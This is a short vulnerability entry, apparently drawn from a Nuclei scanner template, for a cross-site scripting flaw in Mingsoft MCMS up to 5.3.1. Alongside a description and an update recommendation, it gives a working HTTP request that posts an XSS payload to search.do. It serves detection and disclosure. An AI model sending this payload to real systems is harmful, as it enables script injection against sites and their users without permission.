# Vulnerability: Mingsoft MCMS < 5.3.1 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`mcms-search-xss.yaml`)

## Description
A vulnerability classified as problematic has been found in Mingsoft MCMS up to 5.3.1. This affects an unknown part of the file search.do of the component HTTP POST Request Handler.

## Secure Mitigation
We recommend that you update to the latest version 5.4 or above.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /mcms/search.do HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

content_title=1"><sVg/Onload=alert`document.domain`></p>
```

